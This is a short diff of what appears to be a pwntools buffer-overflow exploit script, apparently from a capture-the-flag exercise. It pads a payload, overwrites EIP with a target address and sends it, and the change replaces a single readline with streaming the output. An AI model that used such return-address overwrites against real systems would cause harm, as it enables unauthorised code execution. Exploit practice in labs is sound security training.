@@ -19,4 +19,4 @@ payload += 4 * b"d"  # padding
 payload += p32(dest)  # eip
 p.sendline(payload)
 
-print(p.readlineS())
+p.stream()
